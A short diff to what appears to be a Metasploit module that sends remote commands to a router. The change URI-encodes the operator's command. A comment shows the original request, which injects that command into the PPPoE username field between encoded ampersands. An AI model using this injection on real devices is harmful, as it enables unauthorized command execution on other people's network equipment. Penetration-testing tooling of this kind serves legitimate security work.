@@ -82,7 +82,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
-		cmd = datastore['CMD']
+		#encode our command and do not use encoding of the whole request
+		cmd = Rex::Text.uri_encode(datastore['CMD'])
+
 		#original request:
 		#data_cmd = "login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20#{cmd}%20%26&
 		#pppoe_passwd=test123&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5&WANAssign=Dynamic&
